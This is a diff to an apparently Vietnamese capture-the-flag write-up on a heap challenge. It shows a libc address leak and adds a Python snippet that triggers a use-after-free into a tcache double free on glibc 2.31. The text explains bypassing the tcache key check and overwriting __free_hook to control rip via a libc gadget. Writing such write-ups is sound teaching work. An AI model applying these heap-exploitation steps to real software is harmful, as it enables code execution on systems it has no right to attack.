@@ -76,7 +76,14 @@ r.recvuntil("Your secret:\n")
 base_libc = r.recvuntil("00 00").replace(" ", "")
 base_libc = u64(base_libc.decode('hex')) - 0x1ebbe0
 ```
-Do không hiểu rõ tính năng edit nên mình quyết định sử dùng lỗi UAF này để gây ra tcache dup. Libc 2.31 có kiểm tra tcache dup thông qua `key` trong tcache chunk, tuy nhiên do tính năng encode thay đổi toàn bộ buffer nên overwrite luôn cả `key` nên mình có thể bypass cái check đó. Dùng tcache dup mình có thể overwrite `free_hook` từ đó kiểm soát được `rip`.
+Do không hiểu rõ tính năng edit nên mình quyết định sử dùng lỗi UAF này để gây ra tcache dup.
+```python
+create_secret("AAAA\n", 0x100, "BBBBB\n", True)
+
+encode_secret(6)
+encode_secret(6)
+```
+Libc 2.31 có kiểm tra tcache dup thông qua `key` trong tcache chunk, tuy nhiên do tính năng encode thay đổi toàn bộ buffer nên overwrite luôn cả `key` nên mình có thể bypass cái check đó. Dùng tcache dup mình có thể overwrite `free_hook` từ đó kiểm soát được `rip`.
 Tới đây, mình sử dụng gadget này trong libc
 ```
 gadget = libc + 0x154930
